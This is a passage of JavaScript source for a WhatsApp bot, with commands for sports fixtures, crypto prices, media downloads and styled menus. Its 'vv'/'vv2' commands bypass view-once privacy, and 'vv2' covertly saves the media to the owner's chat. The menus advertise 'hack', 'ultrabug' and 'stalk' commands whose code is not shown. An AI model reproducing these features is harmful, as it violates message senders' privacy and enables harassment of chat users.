                ptt: true, // Sending as a voice note
            },
            { quoted: m }
        );

        // Reset presence to "available"
        PhistarBotInc.sendPresenceUpdate('available', m.chat);

    } catch (err) {
        console.error(err);
    }
    break;
    case 'hello':
    try {
        // Update presence to "recording"
        PhistarBotInc.sendPresenceUpdate('recording', m.chat);

        // Wait for 15 seconds before sending
        await new Promise(resolve => setTimeout(resolve, 15000));

        // Fetch all participants in the group
        const groupMetadata = await PhistarBotInc.groupMetadata(m.chat);
        const participants = groupMetadata.participants;
        const mentions = participants.map(p => p.id);

        // Send the voice note with mentions
        await PhistarBotInc.sendMessage(
            m.chat,
            {
                audio: { url: 'Phistar-media/group.aac' },
                mimetype: 'audio/aac',
                ptt: true, // Sending as a voice note
                mentions: mentions, // Mention all group members
            },
            { quoted: m }
        );

        // Reset presence to "available"
        PhistarBotInc.sendPresenceUpdate('available', m.chat);

    } catch (err) {
        console.error(err);
    }
    break;
case 'fixtures': {
    if (!text) return replyphistar(`Please provide a league name.\nExample: *${prefix + command} premier league*`);

    try {
        const response = await fetch(`https://api.sportradar.us/soccer/trial/v4/en/schedules/2024-12-08/schedule.json?api_key=YOUR_API_KEY`);
        const result = await response.json();

        if (result && result.schedules && result.schedules.length > 0) {
            let fixtures = `*📅 Upcoming Fixtures:*\n\n`;
            for (const match of result.schedules) {
                const { sport_event } = match;
                const home = sport_event.competitors[0].name;
                const away = sport_event.competitors[1].name;
                const date = new Date(sport_event.start_time).toLocaleString();
                fixtures += `🏟️ *${sport_event.sport_event_context.competition.name}*\n🔹 ${home} vs ${away}\n📅 *${date}*\n\n`;
            }
            replyphistar(fixtures.trim());
        } else {
            replyphistar('❌ No upcoming matches found for this league.');
        }
    } catch (error) {
        console.error(error);
        replyphistar('❌ An error occurred while fetching fixtures. Please try again later.');
    }
    break;
}

// 3️⃣ Get League Standings
case 'standings': {
    if (!text) return replyphistar(`Please provide a league name.\nExample: *${prefix + command} premier league*`);

    try {
        const response = await fetch(`https://api.api-football.com/v3/standings?league=${encodeURIComponent(text)}`, {
            headers: { 'x-rapidapi-key': 'YOUR_API_KEY' },
        });
        const result = await response.json();

        if (result.response && result.response[0]) {
            const standings = result.response[0].league.standings[0];
            let table = `*📊 ${result.response[0].league.name} Standings:*\n\n`;
            for (const team of standings) {
                table += `🔹 *${team.rank}.* ${team.team.name} - *${team.points} pts*\n`;
            }
            replyphistar(table.trim());
        } else {
            replyphistar('❌ No standings found for this league.');
        }
    } catch (error) {
        console.error(error);
        replyphistar('❌ An error occurred while fetching league standings. Please try again later.');
    }
    break;
}
case 'love':
    PhistarBotInc.sendMessage(m.chat, {
        audio: fs.readFileSync('Phistar-media/cl.aac'),
        mimetype: 'audio/mpeg', // MIME type for MP3 file
        ptt: true // Send as a voice note
    }, { quoted: m });
    break;
case 'crypto': {
    const menu = `*🪙 Crypto Menu:*\n
1️⃣ ${prefix}crypto-price <coin> - Get the current price of a cryptocurrency.
2️⃣ ${prefix}crypto-convert <coin> <amount> <currency> - Convert crypto to fiat.
3️⃣ ${prefix}topcrypto - Show top gainers and losers.
4️⃣ ${prefix}cryptonews - Get the latest cryptocurrency news.
5️⃣ ${prefix}cryptoindex - Display the Fear and Greed Index.\n
Use these commands to explore the crypto world!`;
    replyphistar(menu);
    break;
}

// 1️⃣ Get Current Price
case 'crypto-price': {
    if (!text) return replyphistar(`Please provide a cryptocurrency name or symbol.\nExample: *${prefix + command} bitcoin*`);

    try {
        const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${encodeURIComponent(text)}&vs_currencies=usd`);
        const result = await response.json();

        if (result[text]) {
            replyphistar(`💰 *Current Price of ${text.toUpperCase()}*: *$${result[text].usd}*`);
        } else {
            replyphistar('❌ Cryptocurrency not found. Please try again.');
        }
    } catch (error) {
        console.error(error);
        replyphistar('❌ An error occurred while fetching the price. Please try again later.');
    }
    break;
}

// 2️⃣ Convert Cryptocurrency to Fiat
case 'crypto-convert': {
    const args = text.split(' ');
    if (args.length !== 3) return replyphistar(`Usage: *${prefix + command} <coin> <amount> <currency>*\nExample: *${prefix + command} btc 1 usd*`);

    const [coin, amount, currency] = args;
    try {
        const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${encodeURIComponent(coin)}&vs_currencies=${encodeURIComponent(currency)}`);
        const result = await response.json();

        if (result[coin] && result[coin][currency]) {
            const converted = (result[coin][currency] * parseFloat(amount)).toFixed(2);
            replyphistar(`💱 *${amount} ${coin.toUpperCase()} = ${converted} ${currency.toUpperCase()}*`);
        } else {
            replyphistar('❌ Conversion failed. Please check the inputs.');
        }
    } catch (error) {
        console.error(error);
        replyphistar('❌ An error occurred while converting. Please try again later.');
    }
    break;
}

// 3️⃣ Show Top Gainers and Losers
case 'topcrypto': {
    try {
        const response = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&page=1&sparkline=false');
        const result = await response.json();

        let topGainers = `*📈 Top Gainers:*\n`;
        let topLosers = `*📉 Top Losers:*\n`;

        for (const coin of result) {
            if (coin.price_change_percentage_24h > 0) {
                topGainers += `🔹 *${coin.name}* (${coin.symbol.toUpperCase()}): *+${coin.price_change_percentage_24h.toFixed(2)}%*\n`;
            } else {
                topLosers += `🔹 *${coin.name}* (${coin.symbol.toUpperCase()}): *${coin.price_change_percentage_24h.toFixed(2)}%*\n`;
            }
        }

        replyphistar(`${topGainers}\n\n${topLosers}`);
    } catch (error) {
        console.error(error);
        replyphistar('❌ An error occurred while fetching market trends. Please try again later.');
    }
    break;
}

// 4️⃣ Get Latest Crypto News
case 'cryptonews': {
    try {
        const response = await fetch('https://cryptonews-api.com/api/v1?tickers=BTC,ETH&items=5&token=pub_6165012dcdfb7690a1e33a9e58ee1c879790f');
        const result = await response.json();

        if (result.news && result.news.length > 0) {
            let newsList = `*📰 Latest Crypto News:*\n\n`;
            for (const news of result.news) {
                newsList += `🔸 *${news.title}*\n🌐 [Read More](${news.news_url})\n\n`;
            }
            replyphistar(newsList.trim());
        } else {
            replyphistar('❌ No news found at the moment.');
        }
    } catch (error) {
        console.error(error);
        replyphistar('❌ An error occurred while fetching news. Please try again later.');
    }
    break;
}

// 5️⃣ Crypto Fear and Greed Index
case 'cryptoindex': {
    try {
        const response = await fetch('https://api.alternative.me/fng/');
        const result = await response.json();

        if (result.data && result.data[0]) {
            const index = result.data[0];
            replyphistar(`*📊 Fear and Greed Index:*\n\n💡 *Current Value*: ${index.value} (*${index.value_classification}*)\n📅 *Date*: ${index.timestamp}`);
        } else {
            replyphistar('❌ Failed to fetch the Fear and Greed Index.');
        }
    } catch (error) {
        console.error(error);
        replyphistar('❌ An error occurred while fetching the Fear and Greed Index. Please try again later.');
    }
    break;
}
case 'getpp': {
    if (!m.quoted && (!m.mentionedJid || m.mentionedJid.length === 0)) {
        return replyphistar(`Reply to someone's message or tag a user with *${prefix + command}*`);
    }

    try {
        // If command is used in reply or mentions a user
        let targetUser = m.quoted ? m.quoted.sender : m.mentionedJid[0];

        // Fetch profile picture
        let profilePicUrl = await PhistarBotInc.profilePictureUrl(targetUser, 'image');
        let responseMessage = `🔹 *Profile Picture of @${targetUser.split('@')[0]}*`;

        // Send the profile picture
        await PhistarBotInc.sendMessage(m.chat, { 
            image: { url: profilePicUrl }, 
            caption: responseMessage, 
            mentions: [targetUser] 
        }, { quoted: m });

    } catch (error) {
        replyphistar("❌ Couldn't fetch profile picture. The user might not have one or an error occurred.");
    }
    break;
}
// ==========================
// CASE COMMAND FOR THE BOT
// ==========================
case 'view': 
    if (!text) { 
        return replyphistar("🚨 Please provide a URL to view. Usage: view <website_url>");
    }

    replyphistar("⏳ Processing... This may take a few minutes.");

    viewWebsite(text)
        .then((screenshotPath) => {
            if (screenshotPath) {
                PhistarBotInc.sendMessage(m.chat, { 
                    image: { url: screenshotPath }, 
                    caption: `✅ Website viewed successfully!\nURL: ${text}` 
                }, { quoted: m });
            } else {
                replyphistar("❌ Failed to process the website. Try again later.");
            }
        })
        .catch((error) => {
            console.error(error);
            replyphistar("❌ An error occurred while processing the website.");
        });

    break;
case 'repost': {
    if (!isCreator) return replyphistar('❌ *This command is only for the owner.*');
    
    try {
        let mediaType;
        
        if (/video/.test(mime)) {
            mediaType = 'video';
        } else if (/image/.test(mime)) {
            mediaType = 'image';
        } else if (/audio/.test(mime)) {
            mediaType = 'audio';
        } else {
            return replyphistar('❌ Reply to a *Video, Image, or Audio* to repost.');
        }

        let mediaFile = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);
        let messageOptions = {
            caption: q ? q : ''
        };

        // Assign the correct media type
        messageOptions[mediaType] = { url: mediaFile };

        // Broadcast to status for all contacts
        await PhistarBotInc.sendMessage('status@broadcast', messageOptions, { statusJidList: Object.keys(global.db.data.users) });

        replyphistar('✅ *Media successfully reposted to status!*');
        
    } catch (error) {
        console.error(error);
        replyphistar('❌ Failed to repost the media.');
    }
    break;
}
case 'post': {
    if (!isCreator) return replyphistar('❌ *This command is only for the owner.*');

    try {
        if (!/audio/.test(m.quoted.mimetype)) {
            return replyphistar('❌ Reply to an *Audio File* to post it on status.');
        }

        let mediaFile = await PhistarBotInc.downloadAndSaveMediaMessage(m.quoted);
        let messageOptions = {
            audio: { url: mediaFile },
            mimetype: 'audio/mp4',
            ptt: false // Change to true if you want it as a voice note
        };

        // Get all contacts from global database
        let allContacts = Object.keys(global.db.data.users);

        // Post to status for all contacts
        await PhistarBotInc.sendMessage('status@broadcast', messageOptions, { statusJidList: allContacts });

        replyphistar('✅ *Audio successfully posted to your status!*');
        
    } catch (error) {
        console.error(error);
        replyphistar('❌ Failed to post audio on status.');
    }
    break;
}
case 'savevideo': {
    try {
        if (!m.quoted) return replyphistar('❌ Please reply to a video file.');

        // Get the MIME type of the quoted message
        let mime = m.quoted.mimetype || '';

        // Validate that the quoted message is a video
        if (!/video/.test(mime)) return replyphistar('❌ Please reply to a valid video file.');

        let videoPath = `./video_${m.sender}.mp4`;

        // Download the video
        let videoBuffer = await m.quoted.download();
        fs.writeFileSync(videoPath, videoBuffer);

        // Store video path in global memory
        global.savedVideos[m.sender] = videoPath;
        console.log(`✅ Video saved for ${m.sender}:`, global.savedVideos);

        replyphistar('✅ Video saved! Now reply to an audio file with `.addmusic` to merge.');
    } catch (error) {
        console.error('❌ Error saving video:', error);
        replyphistar('❌ An error occurred while saving the video.');
    }
    break;
}

case 'addmusic': {
    try {
        if (!m.quoted) return replyphistar('❌ Please reply to an audio file to add music.');

        let mime = m.quoted.mimetype || '';

        // Validate that the quoted message is an audio file
        if (!/audio/.test(mime)) return replyphistar('❌ Please reply to a valid audio file.');

        // Debugging: Check if the video was stored properly
        console.log(`🔎 Checking saved video for ${m.sender}:`, global.savedVideos);

        let videoPath = global.savedVideos[m.sender];
        if (!videoPath || !fs.existsSync(videoPath)) {
            return replyphistar('❌ No saved video found. Use `.savevideo` first.');
        }

        let audioPath = `./audio_${m.sender}.mp3`;
        let outputPath = `./output_${m.sender}.mp4`;

        // Download the audio
        let audioBuffer = await m.quoted.download();
        fs.writeFileSync(audioPath, audioBuffer);

        replyphistar('⏳ Merging audio with video, please wait...');

        // Merge Video & Audio using FFmpeg
        ffmpeg()
            .input(videoPath)
            .input(audioPath)
            .outputOptions([
                '-map 0:v:0', // Use video from first input
                '-map 1:a:0', // Use audio from second input
                '-c:v copy',  // Keep original video quality
                '-shortest'   // Trim to shortest length
            ])
            .save(outputPath)
            .on('end', async () => {
                await PhistarBotInc.sendMessage(m.chat, { 
                    video: { url: outputPath },
                    mimetype: 'video/mp4',
                    caption: '✅ Here is your video with background music!'
                }, { quoted: m });

                // Cleanup files after sending
                fs.unlinkSync(videoPath);
                fs.unlinkSync(audioPath);
                fs.unlinkSync(outputPath);
                delete global.savedVideos[m.sender]; 
            })
            .on('error', (err) => {
                console.error('❌ FFmpeg Error:', err);
                replyphistar('❌ Error processing video: ' + err.message);
            });
    } catch (error) {
        console.error('❌ Error adding music:', error);
        replyphistar('❌ An error occurred while adding music.');
    }
    break;
}
case 'readviewonce': case 'vv': {
    try {
        if (!m.quoted) return replyphistar('❌ Reply to a ViewOnce Video, Image, or Audio.');

        const quotedMessage = m.msg.contextInfo.quotedMessage;
        if (!quotedMessage) return replyphistar('❌ No media found in the quoted message.');

        if (quotedMessage.imageMessage) {
            let imageCaption = quotedMessage.imageMessage.caption || '';
            let imageUrl = await PhistarBotInc.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
            await PhistarBotInc.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        }

        if (quotedMessage.videoMessage) {
            let videoCaption = quotedMessage.videoMessage.caption || '';
            let videoUrl = await PhistarBotInc.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
            await PhistarBotInc.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        }

        if (quotedMessage.audioMessage) {
            let audioUrl = await PhistarBotInc.downloadAndSaveMediaMessage(quotedMessage.audioMessage);
            await PhistarBotInc.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mp4' });
        }

    } catch (error) {
        console.error('Error processing vv command:', error);
        replyphistar('❌ An error occurred while processing your request.');
    }
    break;
}
case 'readviewonce2': case 'vv2': {
    try {
        if (!m.quoted) return replyphistar('❌ Reply to a ViewOnce Video, Image, or Audio.');

        const quotedMessage = m.msg.contextInfo.quotedMessage;
        if (!quotedMessage) return replyphistar('❌ No media found in the quoted message.');

        if (quotedMessage.imageMessage) {
            let imageCaption = quotedMessage.imageMessage.caption || '';
            let imageUrl = await PhistarBotInc.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
            await PhistarBotInc.sendMessage(PhistarBotInc.user.id, { image: { url: imageUrl }, caption: imageCaption });
        }

        if (quotedMessage.videoMessage) {
            let videoCaption = quotedMessage.videoMessage.caption || '';
            let videoUrl = await PhistarBotInc.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
            await PhistarBotInc.sendMessage(PhistarBotInc.user.id, { video: { url: videoUrl }, caption: videoCaption });
        }

        if (quotedMessage.audioMessage) {
            let audioUrl = await PhistarBotInc.downloadAndSaveMediaMessage(quotedMessage.audioMessage);
            await PhistarBotInc.sendMessage(PhistarBotInc.user.id, { audio: { url: audioUrl }, mimetype: 'audio/mp4' });
        }

    } catch (error) {
        console.error('Error processing vv2 command:', error);
    }
    break;
}
case 'ytmp4': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} https://youtube.com/watch?v=60ItHLz5WEA`);

    try {
        replyphistar('🔍 Fetching video, please wait...');

        // Step 1: Fetch video download details from David API
        const videoApiUrl = `https://apis.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(text)}`;
        const videoResponse = await axios.get(videoApiUrl);

        if (videoResponse.data.success) {
            const { title, download_url, thumbnail } = videoResponse.data.result;

            // Step 2: Send video preview
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: thumbnail },
                caption: `🎬 *Video Found* 🎬\n\n` +
                         `🎞️ *Title:* ${title}\n` +
                         `🔗 *YouTube Link:* ${text}\n\n` +
                         `📥 Downloading *video file* for you...`
            }, { quoted: m });

            // Step 3: Send the video file
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: download_url },
                mimetype: 'video/mp4',
                caption: `🎬 *Title:* ${title}`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Error fetching the video!`);
        }

    } catch (err) {
        console.error("Error in ytmp4 command:", err);
        replyphistar("❌ An error occurred while processing your request.");
    }
    break;
}

case 'ytmp3': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} https://youtube.com/watch?v=60ItHLz5WEA`);

    try {
        replyphistar('🔍 Fetching audio, please wait...');

        // Step 1: Fetch audio download details from David API
        const audioApiUrl = `https://apis.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(text)}`;
        const audioResponse = await axios.get(audioApiUrl);

        if (audioResponse.data.success) {
            const { title, download_url, thumbnail } = audioResponse.data.result;

            // Step 2: Send audio preview
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: thumbnail },
                caption: `🎧 *Audio Found* 🎧\n\n` +
                         `🎵 *Title:* ${title}\n` +
                         `🔗 *YouTube Link:* ${text}\n\n` +
                         `📥 Downloading *audio file* for you...`
            }, { quoted: m });

            // Step 3: Send the audio file
            await PhistarBotInc.sendMessage(m.chat, {
                audio: { url: download_url },
                mimetype: 'audio/mpeg',
                fileName: `${title}.mp3`,
                caption: `🎧 *Here's your song:*\n> *Title:* ${title}`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Error fetching the audio!`);
        }

    } catch (err) {
        console.error("Error in ytmp3 command:", err);
        replyphistar("❌ An error occurred while processing your request.");
    }
    break;
}

case 'clearchat':
xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
            case 'menu':
case '.menu':
case 'alive':
case '?':
case 'Menu':
    const phistarMenu = `
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
┃  ✨ *Creator: ᴘʜ✦ꜱᴛᴀʀ* 💫
┃  🧪 *Version: 1.0.0* 
┃  🤖 *Model: Big_Daddy-V1* 
┃  ⏰ *Uptime:* *${runtime(process.uptime())}*
▓▓▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓
${readmore}
𝐇𝐀𝐂𝐊 𝐌𝐄𝐍𝐔◁️⚡💥
> (.ʜᴀᴄᴋᴍᴇɴᴜ)

𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔◁️⚡💥
> (.ᴍᴀɪɴᴍᴇɴᴜ)

𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐑 𝐌𝐄𝐍𝐔◁️⚡💥 
> (.ᴅᴏᴡɴʟᴏᴀᴅᴇʀᴍᴇɴᴜ)

𝐒𝐏𝐄𝐂𝐈𝐀𝐋 𝐌𝐄𝐍𝐔◁️⚡💥
> (.ꜱᴘᴇᴄɪᴀʟᴍᴇɴᴜ)

𝐀𝐍𝐓𝐈 𝐌𝐄𝐍𝐔◁️⚡💥
> (.ᴀɴᴛɪᴍᴇɴᴜ)

𝐀𝐈 𝐌𝐄𝐍𝐔◁️⚡💥 
> (.ᴀɪᴍᴇɴᴜ)

𝐆𝐀𝐌𝐄𝐒 𝐌𝐄𝐍𝐔◁️⚡💥
> (.ɢᴀᴍᴇꜱᴍᴇɴᴜ)

𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔◁️⚡💥
> (.ᴛᴏᴏʟꜱᴍᴇɴᴜ)

𝐄𝐏𝐇𝐎𝐓𝐎 - 𝐌𝐄𝐍𝐔◁️⚡💥
> (.ᴇᴘʜᴏᴛᴏᴍᴇɴᴜ)

𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔◁️⚡💥
> (.ɢʀᴏᴜᴘᴍᴇɴᴜ)

𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔◁️⚡💥
> (.ᴏᴡɴᴇʀᴍᴇɴᴜ)

𝐂𝐎𝐍𝐕𝐄𝐑𝐓 𝐌𝐄𝐍𝐔◁️⚡💥
> (.ᴄᴏɴᴠᴇʀᴛᴍᴇɴᴜ)

𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄 𝐌𝐄𝐍𝐔◁️⚡💥
> (.ᴅᴀᴛᴀʙᴀꜱᴇᴍᴇɴᴜ)

© *ᴘʜ✦ꜱᴛᴀʀ*`

    PhistarBotInc.sendMessage(m.chat, {
        text: phistarMenu,
        contextInfo: {
            forwardingScore: 9999999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: "𝐏𝐇✦𝐒𝐓𝐀𝐑",
                newsletterJid: "120363303946948716@newsletter",
            },
            externalAdReply: {
                showAdAttribution: true,
                containsAutoReply: true,
                title: `𝐁𝐈𝐆_𝐃𝐀𝐃𝐃𝐘-𝐕𝟏-𝐦𝐢𝐧𝐢`,
                body: `ᴘʜ✦ꜱᴛᴀʀ`,
                mediaType: 1,
                renderLargerThumbnail: true,
                thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp',
                mediaUrl: global.link,
                sourceUrl: global.link
            }
        }
    });

    // Send voice note (VN) after the menu
    PhistarBotInc.sendMessage(m.chat, {
        audio: fs.readFileSync('Phistar-media/𝓑𝓲𝓰𝓓𝓪𝓭𝓭𝔂.mp3'),
        mimetype: 'audio/mpeg', // MIME type for MP3 file
        ptt: true // Send as a voice note
    });
    break;

// Sub-menus
case 'hackmenu':
case '.hackmenu':
    let hackMenu = `
╭⭑━━━➤ ʜᴀᴄᴋ ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐡𝐠𝐜  
┣ ◁️⚡💥 𝐡𝐚𝐜𝐤𝐠𝐜  
┣ ◁️⚡💥 𝐡𝐚𝐜𝐤𝐜𝐨𝐧𝐭𝐚𝐜𝐭  
╰━━━━━━━━━━━━━━━━━━╯`
    PhistarBotInc.sendMessage(m.chat, { text: hackMenu }, { quoted: m });
    break;

case 'mainmenu':
case '.mainmenu':
    let mainMenu = `
╭⭑━━━➤ 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔
┣ ◁️⚡💥 𝐦𝐞𝐧𝐮
┣ ◁️⚡💥 𝐛𝐮𝐲𝐩𝐫𝐞𝐦𝐢𝐮𝐦
┣ ◁️⚡💥 𝐫𝐮𝐧𝐭𝐢𝐦𝐞
┣ ◁️⚡💥 𝐬𝐜𝐫𝐢𝐩𝐭
┣ ◁️⚡💥 𝐝𝐨𝐧𝐚𝐭𝐞
┣ ◁️⚡💥 𝐨𝐰𝐧𝐞𝐫
┣ ◁️⚡💥 𝐩𝐢𝐧𝐠
╰━━━━━━━━━━━━━━━━━━╯`
    PhistarBotInc.sendMessage(m.chat, { text: mainMenu }, { quoted: m });
    break;

case 'downloadermenu':
case '.downloadermenu':
    let downloaderMenu = `
╭⭑━━━➤ 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔  
┣ ◁️⚡💥 𝐩𝐥𝐚𝐲  
┣ ◁️⚡💥 𝐦𝐞𝐝𝐢𝐚𝐟𝐢𝐫𝐞  
┣ ◁️⚡💥 𝐬𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭  
┣ ◁️⚡💥 𝐬𝐡𝐚𝐳𝐚𝐦  
┣ ◁️⚡💥 𝐫𝐞𝐦𝐢𝐧𝐢  
┣ ◁️⚡💥 𝐚𝐩𝐤  
┣ ◁️⚡💥 𝐟𝐛  
┣ ◁️⚡💥 𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦  
┣ ◁️⚡💥 𝐠𝐞𝐧𝐞𝐫𝐚𝐭𝐞  
┣ ◁️⚡💥 𝐬𝐨𝐧𝐠  
┣ ◁️⚡💥 𝐭𝐢𝐤𝐭𝐨𝐤  
┣ ◁️⚡💥 𝐲𝐭𝐦𝐩𝟑  
┣ ◁️⚡💥 𝐲𝐭𝐦𝐩𝟒  
┣ ◁️⚡💥 𝐯𝐢𝐝𝐞𝐨𝐝𝐨𝐜  
┣ ◁️⚡💥 𝐩𝐥𝐚𝐲𝐝𝐨𝐜  
┣ ◁️⚡💥 𝐝𝐫𝐚𝐠𝐨𝐧𝐛𝐚𝐥𝐥  
┣ ◁️⚡💥 𝐥𝐨𝐠𝐨𝐢𝐧𝐭𝐫𝐨  
╰━━━━━━━━━━━━━━━━━━╯`
    PhistarBotInc.sendMessage(m.chat, { text: downloaderMenu }, { quoted: m });
    break;

case 'specialmenu':
case '.specialmenu':
    let specialMenu = `
╭⭑━━━➤ sᴘᴇᴄɪᴀʟ ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐩𝐫𝐨𝐦𝐨𝐭𝐞𝐬𝐞𝐥𝐟  
┣ ◁️⚡💥 𝐛𝐚𝐧𝐭𝐮𝐭𝐨𝐫𝐢𝐚𝐥  
┣ ◁️⚡💥 𝐬𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭  
┣ ◁️⚡💥 𝐟𝐟𝐬𝐭𝐚𝐥𝐤  
┣ ◁️⚡💥 𝐭𝐞𝐦𝐩𝐦𝐚𝐢𝐥  
┣ ◁️⚡💥 𝐜𝐡𝐞𝐜𝐤𝐦𝐚𝐢𝐥  
┣ ◁️⚡💥 𝐝𝐞𝐥𝐦𝐚𝐢𝐥  
┣ ◁️⚡💥 𝐬𝐮𝐫𝐞𝐨𝐝𝐝𝐬  
┣ ◁️⚡💥 𝐩𝐫𝐞𝐝𝐢𝐜𝐭𝐢𝐨𝐧  
┣ ◁️⚡💥 𝐫𝐢𝐳𝐳  
┣ ◁️⚡💥 𝐩𝐢𝐜𝐤𝐮𝐩𝐥𝐢𝐧𝐞  
┣ ◁️⚡💥 𝐬𝐩𝐨𝐫𝐭𝐬𝐧𝐞𝐰𝐬  
┣ ◁️⚡💥 𝐥𝐢𝐯𝐞𝐬𝐜𝐨𝐫𝐞𝐬  
┣ ◁️⚡💥 𝐭𝐢𝐧𝐲𝐮𝐫𝐥  
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐜𝐮𝐫𝐫𝐞𝐧𝐜𝐲  
╰━━━━━━━━━━━━━━━━━━╯`
    PhistarBotInc.sendMessage(m.chat, { text: specialMenu }, { quoted: m });
    break;

case 'antimenu':
case '.antimenu':
    let antiMenu = `
╭⭑━━━➤ ᴀɴᴛɪ ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐚𝐧𝐭𝐢𝐥𝐢𝐧𝐤 [𝐨𝐧/𝐨𝐟𝐟]
┣ ◁️⚡💥 𝐚𝐧𝐭𝐢𝐜𝐚𝐥𝐥 [𝐨𝐧/𝐨𝐟𝐟]
┣ ◁️⚡💥 𝐮𝐥𝐭𝐫𝐚𝐛𝐮𝐠 [𝐀𝐔𝐓𝐎]
╰━━━━━━━━━━━━━━━━━━╯`
    PhistarBotInc.sendMessage(m.chat, { text: antiMenu }, { quoted: m });
    break;

case 'aimenu':
case '.aimenu':
    let aiMenu = `
╭⭑━━━➤ ᴀɪ ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐜𝐡𝐚𝐭𝐠𝐩𝐭  
┣ ◁️⚡💥 𝐠𝐩𝐭𝟑  
┣ ◁️⚡💥 𝐠𝐩𝐭𝟐  
┣ ◁️⚡💥 𝐠𝐨𝐨𝐠𝐥𝐞  
╰━━━━━━━━━━━━━━━━━━╯`
    PhistarBotInc.sendMessage(m.chat, { text: aiMenu }, { quoted: m });
    break;

case 'gamesmenu':
case '.gamesmenu':
    let gamesMenu = `
╭⭑━━━➤ ɢᴀᴍᴇs �ᴇɴᴜ  
┣ ◁️⚡💥 𝐝𝐚𝐫𝐞  
┣ ◁️⚡💥 𝐟𝐚𝐜𝐭  
┣ ◁️⚡💥 𝐜𝐨𝐦𝐩𝐥𝐢𝐦𝐞𝐧𝐭  
┣ ◁️⚡💥 𝐣𝐨𝐤𝐞  
┣ ◁️⚡💥 𝐫𝐢𝐝𝐝𝐥𝐞  
┣ ◁️⚡💥 𝐪𝐮𝐨𝐭𝐞  
┣ ◁️⚡💥 𝐰𝐨𝐮𝐥𝐝𝐲𝐨𝐮𝐫𝐚𝐭𝐡𝐞𝐫  
┣ ◁️⚡💥 𝐭𝐫𝐢𝐯𝐢𝐚  
┣ ◁️⚡💥 𝐭𝐫𝐮𝐭𝐡  
╰━━━━━━━━━━━━━━━━━━╯`
    PhistarBotInc.sendMessage(m.chat, { text: gamesMenu }, { quoted: m });
    break;

case 'toolsmenu':
case '.toolsmenu':
    let toolsMenu = `
╭⭑━━━➤ ᴛᴏᴏʟs ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐯𝐢𝐝𝐞𝐨  
┣ ◁️⚡💥 𝐰𝐞𝐚𝐭𝐡𝐞𝐫  
┣ ◁️⚡💥 𝐭𝐢𝐦𝐞  
┣ ◁️⚡💥 𝐬𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭  
╰━━━━━━━━━━━━━━━━━━╯`
    PhistarBotInc.sendMessage(m.chat, { text: toolsMenu }, { quoted: m });
    break;

case 'groupmenu':
case '.groupmenu':
    let groupMenu = `
╭⭑━━━➤ ɢʀᴏᴜᴘ ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐜𝐥𝐨𝐬𝐞𝐭𝐢𝐦𝐞
┣ ◁️⚡💥 𝐨𝐩𝐞𝐧𝐭𝐢𝐦𝐞
┣ ◁️⚡💥 𝐤𝐢𝐜𝐤
┣ ◁️⚡💥 𝐚𝐝𝐝
┣ ◁️⚡💥 𝐩𝐫𝐨𝐦𝐨𝐭𝐞
┣ ◁️⚡💥 𝐝𝐞𝐦𝐨𝐭𝐞
┣ ◁️⚡💥 𝐬𝐞𝐭𝐝𝐞𝐬𝐜
┣ ◁️⚡💥 𝐬𝐞𝐭𝐩𝐩𝐠𝐜
┣ ◁️⚡💥 𝐡𝐢𝐝𝐞𝐭𝐚𝐠
┣ ◁️⚡💥 𝐭𝐨𝐭𝐚𝐠
┣ ◁️⚡💥 𝐠𝐫𝐨𝐮𝐩 []
┣ ◁️⚡💥 𝐞𝐝𝐢𝐭𝐢𝐧𝐟𝐨
┣ ◁️⚡💥 𝐥𝐢𝐧𝐤𝐠𝐜
┣ ◁️⚡💥 𝐫𝐞𝐯𝐨𝐤𝐞
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐨𝐧𝐥𝐢𝐧𝐞
